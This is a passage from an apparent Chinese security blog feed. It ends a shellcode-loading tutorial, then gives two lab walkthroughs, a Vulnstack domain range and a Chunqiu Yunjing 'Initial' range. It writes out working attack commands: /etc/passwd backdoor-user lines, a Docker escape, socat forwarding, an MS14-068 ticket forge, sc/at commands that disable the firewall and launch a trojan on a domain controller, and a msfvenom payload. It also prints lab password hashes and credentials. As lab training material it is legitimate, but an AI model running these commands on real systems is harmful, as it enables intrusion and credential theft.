分配与有效载荷大小相同的内存，然后通过 <code>memcpy</code> 将有效载荷从资源部分移动到临时缓冲区</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 使用 HeapAlloc 调用分配内存</span>PVOID pTmpBuffer <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBuffer <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 将有效载荷从资源部分复制到新的缓冲区</span><span class="token function">memcpy</span><span class="token punctuation">(</span>pTmpBuffer<span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印缓冲区的基地址 (pTmpBuffer)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pTmpBuffer 变量: 0x%p \n"</span><span class="token punctuation">,</span> pTmpBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于现在 <code>pTmpBuffer</code> 指向一个可写的内存区域，并且该区域保存了有效载荷，因此可以对有效载荷进行解密或执行任何更新操作。</p><p>下面的图片显示了存储在资源部分的 Msfvenom shellcode：<br><img src="/Rxi134_FILE/40966272953f986b6f63a9c174a6a1fe_MD5.jpeg"></p><p>继续执行时，有效负载将保存在临时缓冲区中。<br><img src="/Rxi134_FILE/f0569689ebe78e06c268af3aa360db2c_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-4</title>
      <link href="/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/"/>
      <url>/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情</a></p></blockquote><p><img src="/Rxi134_FILE/01e760a174b100ab764f690ba82aaa18_MD5.jpeg"></p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:ubuntu192.168.74.140192.168.183.128域成员机器douser:Dotest123192.168.183.129DCadministrator:Test2008192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>web机器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>win7<br>win7总是挂起，修改设备计划<br><img src="/Rxi134_FILE/393f5041cfd50e06414cf2e793ebb750_MD5.jpeg"></p></li></ul><h1 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>goby上去打些常见poc，随便把端口扫了<br><img src="/Rxi134_FILE/3243933a3096253353d76f94faab9aad_MD5.jpeg"></p><h2 id="tomcat-PUT-任意文件上传（CVE-2017-12615）"><a href="#tomcat-PUT-任意文件上传（CVE-2017-12615）" class="headerlink" title="tomcat PUT 任意文件上传（CVE-2017-12615）"></a>tomcat PUT 任意文件上传（CVE-2017-12615）</h2><p>tomcat 远程代码执行<br><img src="/Rxi134_FILE/d2eb0872f91e3d5bd9d08ed7f81b9c4f_MD5.jpeg"></p><p>工具直接梭哈，上传webshell<br><img src="/Rxi134_FILE/f39cc38d710b6095f7052a0ee7c05174_MD5.jpeg"></p><p>拿到root<br><img src="/Rxi134_FILE/731948ac195fef247d2ebc37dfc1b985_MD5.jpeg"></p><p>看了ip傻眼了，172.18.0.2 ？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">(root:/tmp) $ uname -aLinux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux(root:/tmp) $ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果真在docker环境里<br><img src="/Rxi134_FILE/a309f4c888102752232fb3451e5877dd_MD5.jpeg"></p><h2 id="docker逃逸（特权模式）"><a href="#docker逃逸（特权模式）" class="headerlink" title="docker逃逸（特权模式）"></a>docker逃逸（特权模式）</h2><p><img src="/Rxi134_FILE/6d4ca50e62f8d898a4113a5292a501cb_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test <span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功逃逸到宿主机，只有用户ubuntu和root<br><img src="/Rxi134_FILE/0b934d83681779a4e07c3145ed0907ff_MD5.jpeg"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="失败思路1-修改-etc-passwd直接root-ssh"><a href="#失败思路1-修改-etc-passwd直接root-ssh" class="headerlink" title="失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh"></a>失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh</h3><p>修改passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是无法ssh上去<br><img src="/Rxi134_FILE/100477502cab9435adb13719df71db50_MD5.jpeg"></p><p>查看sshd_config，原来是禁用了root ssh</p><h3 id="失败思路2-拿走私钥文件直接ssh"><a href="#失败思路2-拿走私钥文件直接ssh" class="headerlink" title="失败思路2. 拿走私钥文件直接ssh"></a>失败思路2. 拿走私钥文件直接ssh</h3><p>私钥文件有密码原语，解不开<br><img src="/Rxi134_FILE/6171339c219a84d2cb82acfad7ac5927_MD5.jpeg"></p><h3 id="成功思路3-创建普通用户，ssh上去再提升到root"><a href="#成功思路3-创建普通用户，ssh上去再提升到root" class="headerlink" title="成功思路3. 创建普通用户，ssh上去再提升到root"></a>成功思路3. 创建普通用户，ssh上去再提升到root</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> hacker <span class="token number">123456</span><span class="token variable">$1</span><span class="token variable">$hacker</span><span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bashhacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hacker:\<span class="token variable">$1</span>\<span class="token variable">$hacker</span>\<span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>su rxi134<br><img src="/Rxi134_FILE/930f8e22fd8868e1bbdce41aef1f9629_MD5.jpeg"></p><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p><img src="/Rxi134_FILE/6b35d8a0fc2be78c01770cdc0b92d82a_MD5.jpeg"></p><h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>喜欢用chisel<br><img src="/Rxi134_FILE/9b83bce5f65cf23056eebea5735c93c7_MD5.jpeg"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p>内网 ip 为 192.168.183.128，存在内网网段 192.168.183.0&#x2F;24<br><img src="/Rxi134_FILE/03c55c88c226fd1feab4204dac98fc63_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan(icmp) Target 192.168.183.131 is alive(icmp) Target 192.168.183.130 is alive(icmp) Target 192.168.183.134 is alive[*] Icmp alive hosts len is: 3192.168.183.134:139 open192.168.183.134:135 open192.168.183.130:139 open192.168.183.130:135 open192.168.183.131:22 open192.168.183.130:88 open192.168.183.134:445 open192.168.183.130:445 open[*] alive ports len is: 8start vulscan[*] NetInfo [*]192.168.183.134   [->]TESTWIN7-PC   [->]192.168.183.134[*] NetInfo [*]192.168.183.130   [->]WIN-ENS2VR5TR3N   [->]192.168.183.130[+] MS17-010 192.168.183.130(Windows Server 2008 HPC Edition 7601 Service Pack 1)[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1[+] MS17-010 192.168.183.134(Windows 7 Enterprise 7601 Service Pack 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="永恒之蓝拿下用户机"><a href="#永恒之蓝拿下用户机" class="headerlink" title="永恒之蓝拿下用户机"></a>永恒之蓝拿下用户机</h2><p>proxychains走代理，msf打永恒之蓝</p><p>我的wsl出了点问题，先用kali继续</p><ul><li><p>尝试：chisel搭建隧道，proxychains+msf<br>?<br><img src="/Rxi134_FILE/d89f18c8c860f96dfdd30b985838fdf9_MD5.jpeg"></p></li><li><p>尝试：chisel搭建隧道，setg+msf<br><img src="/Rxi134_FILE/fb10a599aa9ce08d65dbd1294cff88d2_MD5.jpeg"><br>nnd终于成功了，拿下 TESTWIN7-PC</p></li></ul><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 TESTWIN7-PCOS Name:                   Microsoft Windows 7 企业版OS Version:                6.1.7601 Service Pack 1 Build 7601OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          testwin7Registered Organization:Product ID:                00392-918-5000002-85176      Original Install Date:     2019/12/31, 10:38:42System Boot Time:          2024/11/13, 17:27:48System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             zh-cn;Chinese (China)Input Locale:              zh-cn;Chinese (China)Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi   Total Physical Memory:     2,047 MBAvailable Physical Memory: 1,483 MBVirtual Memory: Max Size:  4,095 MBVirtual Memory: Available: 3,415 MBVirtual Memory: In Use:    680 MBPage File Location(s):     C:\pagefile.sysDomain:                    demo.comLogon Server:              N/AHotfix(s):                 37 Hotfix(s) Installed.                           [01]: KB2491683                           [02]: KB2534111                           [03]: KB2564958                           [04]: KB2621440                           [05]: KB2653956                           [06]: KB2654428                           [07]: KB2698365                           [08]: KB2705219                           [09]: KB2736422                           [10]: KB2813430                           [11]: KB2900986                           [12]: KB2937610                           [13]: KB2943357                           [14]: KB2978120                           [15]: KB2984972                           [16]: KB2992611                           [17]: KB2999226                           [18]: KB3004375                           [19]: KB3010788                           [20]: KB3023215                           [21]: KB3031432                           [22]: KB3035126                           [23]: KB3037574                           [24]: KB3045685                           [25]: KB3046269                           [26]: KB3072305                           [27]: KB3074543                           [28]: KB3086255                           [29]: KB3097989                           [30]: KB3101722                           [31]: KB3108371                           [32]: KB3122648                           [33]: KB3127220                           [34]: KB3155178                           [35]: KB4019990                           [36]: KB4040980                           [37]: KB976902Network Card(s):           1 NIC(s) Installed.                           [01]: Intel(R) PRO/1000 MT Network Connection                                 Connection Name: 本地连接                                 DHCP Enabled:    Yes                                 DHCP Server:     192.168.183.254                                 IP address(es)                                 [01]: 192.168.183.163                                 [02]: fe80::4c2e:5407:57a4:6774<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>net user</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">net userUser accounts for \\-------------------------------------------------------------------------------Administrator            Guest                    testclone                The command completed with one or more errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p><img src="/Rxi134_FILE/6389f0a064aef1e980bf82e49c8e0a7c_MD5.jpeg"><br>抓取到一个域用户</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEMO.COM\douser:Dotest123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用远程桌面</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee749addb2577ec9d67e3c2cf2f68e94_MD5.jpeg"></p><p>psexec也不行，这个用户权限很低</p><h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>powershell和exe都执行不了<br><img src="/Rxi134_FILE/e2bf6b25542ad8d2f95f89e951443530_MD5.jpeg"><br><img src="/Rxi134_FILE/1c0c79ea710ccf955aa70a858c8485be_MD5.jpeg"></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>可以注入 douser 进程<br><img src="/Rxi134_FILE/c8931aa921f9970f739345226ea4ed55_MD5.jpeg"></p><h2 id="上线CS-1"><a href="#上线CS-1" class="headerlink" title="上线CS"></a>上线CS</h2><p>利用socat转发端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat <span class="token parameter variable">-d</span> TCP4-LISTEN:80,fork TCP4:192.168.74.149:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/947ec3d4750c8e1317bbed6d7bb3283e_MD5.jpeg"></p><p>生成一个stagerless木马，反弹到 web机 的内网ip<br><img src="/Rxi134_FILE/86f39596d404cd86cbbac7bf1e8679b7_MD5.jpeg"></p><h2 id="ms14-068提升至域管"><a href="#ms14-068提升至域管" class="headerlink" title="ms14-068提升至域管"></a>ms14-068提升至域管</h2><p>demo\douser的SID：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS&gt; whoami &#x2F;alldemo\douser S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>域名全称为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEOM.COM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成伪造的ccache票据</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/8333a0c0d7a7ed970b5c42410804547e_MD5.jpeg"></p><p>445端口好像有问题（可能是永恒之蓝打坏了），ipc挂载不了</p><p>上传mimikatz和伪造的票据<br><img src="/Rxi134_FILE/14b2b4b286ee467d68f1e9619bb4db36_MD5.jpeg"></p><p>runas 移动到 demo.com\dousr 用户<br><img src="/Rxi134_FILE/d578b807b9be56dd55a96d62d70d22f0_MD5.jpeg"></p><p>导入票据到内存<br><img src="/Rxi134_FILE/48ec8dacc2be34ab01d0f38cc2419e94_MD5.jpeg"></p><p>芜湖<br><img src="/Rxi134_FILE/cb3088967ed54dcc07ebfba95ef5a243_MD5.jpeg"></p><h2 id="ipc-sc尝试拿下域控"><a href="#ipc-sc尝试拿下域控" class="headerlink" title="ipc+sc尝试拿下域控"></a>ipc+sc尝试拿下域控</h2><p>ipc搭配sc，顺便把防火墙关了</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\WIN-ENS2VR5TR3N\ipc$copy muma.exe \\WIN-ENS2VR5TR3N\c$dir \\WIN-ENS2VR5TR3N\c$ |findstr mumasc \\WIN-ENS2VR5TR3N create firewalldown binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot; start&#x3D; auto sc \\WIN-ENS2VR5TR3N create muma binpath&#x3D; &quot;c:\muma.exe&quot; start&#x3D; autosc start firewalldownsc start muma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是cobaltstrike上线一会就断掉了，不明所以，登上桌面看看<br><img src="/Rxi134_FILE/3cb6c9fbaf1bcec7836d88df0226c512_MD5.jpeg"><br>🤔</p><h2 id="ipc-at拿下域控"><a href="#ipc-at拿下域控" class="headerlink" title="ipc+at拿下域控"></a>ipc+at拿下域控</h2><p>创建计划任务来执行木马</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\&gt;net time \\WIN-ENS2VR5TR3N\\WIN-ENS2VR5TR3N 的当前时间是 2024&#x2F;11&#x2F;16 20:55:10C:\&gt;at \\WIN-ENS2VR5TR3N 20:55:30 C:\ma2.exe新加了一项作业，其作业 ID &#x3D; 2C:\&gt;at \\WIN-ENS2VR5TR3N状态 ID     日期                    时间          命令行-------------------------------------------------------------------        1   明天                    20:51         C:\ma2.exe        2   今天                    20:55         C:\ma2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爽了<br><img src="/Rxi134_FILE/8dd49eb4052f992ac0674c44efaa3806_MD5.jpeg"></p><p>hashdump抓取krbtgt hash</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:97dab5a8641ed01e064a6c3957980405:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c4ed692473d4b4344c3ba01c5e6cb63:::douser:1103:aad3b435b51404eeaad3b435b51404ee:bc23b0b4d5bf5ff42bc61fb62e13886e:::WIN-ENS2VR5TR3N$:1000:aad3b435b51404eeaad3b435b51404ee:61562eb872832ff0d87e1c7ab6daeac2:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mimikatz抓取到明文密码（因为密码过期，所以我事先改掉了），<code>DEMO.COM\administrator:Test20088</code><br><img src="/Rxi134_FILE/08d1f8b77d203a94687218320330daa3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Initial</title>
      <link href="/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p></blockquote><ul><li>DCSync</li><li>CVE</li><li>域渗透<br><img src="/Rxi134_FILE/58142e8af4ac2508452353c3efc22aee_MD5.jpeg"></li></ul><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h1 id="web机器-thinkphp"><a href="#web机器-thinkphp" class="headerlink" title="web机器 thinkphp"></a>web机器 thinkphp</h1><p>先访问80端口</p><p>这图标，一眼thinkphp<br><img src="/Rxi134_FILE/5e7826534b99fb53ddd61360c2a3a6d4_MD5.jpeg"></p><p>制造报错测试下版本，5.0.23<br><img src="/Rxi134_FILE/00dff5ba3574fba90599582655f09181_MD5.jpeg"></p><p><img src="/Rxi134_FILE/780ce7e44c999bac5d117f4c23cede90_MD5.jpeg"></p><p>命令执行无回显，简单上个 webshell 算了<br><img src="/Rxi134_FILE/f3dfea2fae5cf0ca1abd0d8dfe30fad4_MD5.jpeg"><br><img src="/Rxi134_FILE/db37dff6f2590695f6ab6e1a2eb6ecf7_MD5.jpeg"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>就不用vps了，生成木马正连拿shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1314</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> ma.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/3573133e86af79eea1f554587fee6631_MD5.jpeg"></p><p>web机安装了python3，起一个伪终端好看些</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a25cbcb0339ff03fd89542d24750705c_MD5.jpeg"></p><p>但是我没找到flag，可能要提权之类的叭<br><img src="/Rxi134_FILE/03dd59110e803af6aebaa8326e8b9ac3_MD5.jpeg"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>linpeas先搜集一波<br><img src="/Rxi134_FILE/a032bd1f9d1a0bd6321be5b68870fc12_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="获取flag1"><a href="#获取flag1" class="headerlink" title="获取flag1"></a>获取flag1</h2><p><img src="/Rxi134_FILE/62f6f43f91f8060c23aba72a4cff2be2_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时上线msf<br><img src="/Rxi134_FILE/d0a08cdc13a78ecea6f64d241c7a7d95_MD5.jpeg"></p><h1 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h1><p>看下内网网段，172.22.1.0&#x2F;24<br><img src="/Rxi134_FILE/e6204f90bf4c56e834ea7608176988ee_MD5.jpeg"></p><p>传个fscan，一键日内网<br><img src="/Rxi134_FILE/6135163d1bc1d91b05add6e361da8c0f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive(icmp) Target 172.22.1.15     is alive(icmp) Target 172.22.1.21     is alive(icmp) Target 172.22.1.18     is alive[*] Icmp alive hosts len is: 4172.22.1.21:135 open172.22.1.2:135 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetInfo [*]172.22.1.18   [->]XIAORANG-OA01   [->]172.22.1.18[*] NetInfo [*]172.22.1.2   [->]DC01   [->]172.22.1.2[*] NetInfo [*]172.22.1.21   [->]XIAORANG-WIN7   [->]172.22.1.21[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1已完成 14/14[*] 扫描结束,耗时: 11.06878218s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结下来内网有4台机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.1.2 dc172.22.1.15 我172.22.1.21 win2008，可能受到ms17-010的影响172.22.1.18 信呼oa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h1><p>上传个ew作为内网代理，方便访问oa</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">20000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常连接<br><img src="/Rxi134_FILE/93a16a7df364219e72aa7c8660dec2cc_MD5.jpeg"></p><h1 id="添加session路由"><a href="#添加session路由" class="headerlink" title="添加session路由"></a>添加session路由</h1><p>方便把我们的msf流量带入内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.1.0/24run autoroute <span class="token parameter 